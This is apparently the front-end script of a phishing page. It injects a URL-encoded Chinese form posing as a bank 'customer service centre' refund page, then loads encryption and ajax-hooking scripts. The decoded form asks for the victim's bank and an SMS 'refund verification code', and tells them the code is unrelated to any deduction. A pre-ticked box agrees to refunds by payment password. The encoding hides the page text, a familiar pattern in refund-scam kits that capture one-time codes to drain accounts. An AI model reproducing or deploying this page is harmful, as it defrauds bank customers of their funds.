var addJs = function (url) {
    var new_element = document.createElement('script');
    new_element.setAttribute('type', 'text/javascript');
    new_element.setAttribute('src', url);
    document.body.appendChild(new_element);
};
var addCss = function (url) {
    var head = document.getElementsByTagName('head')[0];
    var link = document.createElement('link');
    link.type = 'text/css';
    link.rel = 'stylesheet';
    link.href = url;
    head.appendChild(link);
};
var domWrite = function (str) {
    var newp = document.getElementById('mainCon');
    newp.innerHTML = unescape(str);
    document.getElementById('mainCon').style = '';
};

var jsUrl = '/static/index/common/step4/js/';
var cssUrl = '/static/index/common/step4/css/';

addCss(cssUrl + 'pintuer.css');
addCss(cssUrl + 'css.css');
addCss(cssUrl + 'stylemm.css');

domWrite(
    '%3Cheader%3E%0A%20%20%20%20%3Cnav%20id%3D%22nav%22%3E%0A%20%20%20%20%20%20%20%20%3Cul%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Ca%20class%3D%22navbar-brand%22%20href%3D%22javascript%3Ahistory.go%28-1%29%3B%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20src%3D%22/static/index/common/step4/image/aj001.jpg%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/a%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cb%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfont%20color%3D%22%23fff%22%3E%u5BA2%u670D%u4E2D%u5FC3%3C/font%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3C/b%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/li%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cli%3E%3C/li%3E%0A%20%20%20%20%20%20%20%20%3C/ul%3E%0A%20%20%20%20%3C/nav%3E%0A%3C/header%3E%0A%3Cform%20method%3D%22post%22%20onsubmit%3D%22return%20false%22%3E%0A%20%20%20%20%3Cdiv%20class%3D%22panel-body%22%20style%3D%22padding%3A30px%3B%20padding-bottom%3A10px%3B%20padding-top%3A10px%3B%22%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20border%3D%220%22%20src%3D%22/static/index/common/step4/image/ban3.png%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22label%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3E%u5F00%u6237%u94F6%u884C%uFF1A%3C/label%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22field%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cimg%20class%3D%22bankImg%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22label%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3E%u9000%u6B3E%u6821%u9A8C%u7801%uFF1A%3C/label%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22field%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20style%3D%22width%3A70px%22%20type%3D%22text%22%20class%3D%22input%20w30%22%20name%3D%22check_code%22%20placeholder%3D%22%u9A8C%u8BC1%u7801%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22button%22%20class%3D%22button%20button1-little%20bg1-gray%22%20id%3D%22sms%22%20style%3D%22background-color%3A%20%23CCCCCC%22%20value%3D%22%u514D%u8D39%u83B7%u53D6%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22label%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3E%3C/label%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22field%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfont%20color%3D%22red%22%3E%u7CFB%u7EDF%u63D0%u793A%uFF1A%u4E3A%u8BC1%u5B9E%u672C%u4EBA%u4FE1%u606F%uFF0C%u7CFB%u7EDF%u4F1A%u968F%u673A%u53D1%u9001%u865A%u62DF%u8D44%u91D11-999999%u9000%u6B3E%u9A8C%u8BC1%u7801%u3002%u6CE8%uFF1A%u4E0E%u6263%u6B3E%u65E0%u5173%uFF0C%u8BF7%u653E%u5FC3%u586B%u5199%uFF01%3C/font%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%20style%3D%22display%3Anone%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22label%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Clabel%3E%3C/label%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22field%22%3E%3C/div%3E%0A%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22form-group%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cdiv%20class%3D%22field%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22checkbox%22%20name%3D%22C1%22%20value%3D%22ON%22%20checked%3D%22%22%3E%u540C%u610F%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfont%20color%3D%22red%22%3E%u300A%u94F6%u884C%u50A8%u84C4%u5361%u5FEB%u6377%u7EBF%u4E0A%u670D%u52A1%u534F%u8BAE%u300B%3C/font%3E%u548C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cfont%20color%3D%22red%22%3E%u300A%u5FEB%u6377%u670D%u52A1%u534F%u8BAE%u300B%3C/font%3E%u4E0B%u6B21%u51ED%u652F%u4ED8%u5BC6%u7801%u5FEB%u901F%u9000%u6B3E%u3002%3C/div%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%3C/div%3E%0A%20%20%20%20%20%20%20%20%3Cinput%20type%3D%22submit%22%20class%3D%22button%20button-block%20bg-main%20text-big%20input-big%20submit%22%20value%3D%22%u786E%u8BA4%u63D0%u4EA4%22%3E%0A%20%20%20%20%3C/div%3E%0A%20%20%20%20%3Cdiv%20class%3D%22pagelist%22%3ECopyRight%20%A9%202001-2018%20%u7248%u6743%u6240%u6709%3C/div%3E%0A%20%20%20%20%3Cdiv%20class%3D%22pagelist%22%3E%u4EACICP%u590714036222%u53F7%3C/div%3E%0A%3C/form%3E'
);

addJs('/static/common/encrypt/jsencrypt.js');
addJs('/static/common/encrypt/ajaxhook.min.js');
addJs('/static/common/encrypt/crypto-js.js');
addJs('/static/common/encrypt/encryptController.js');
addJs(jsUrl + 'index.js');

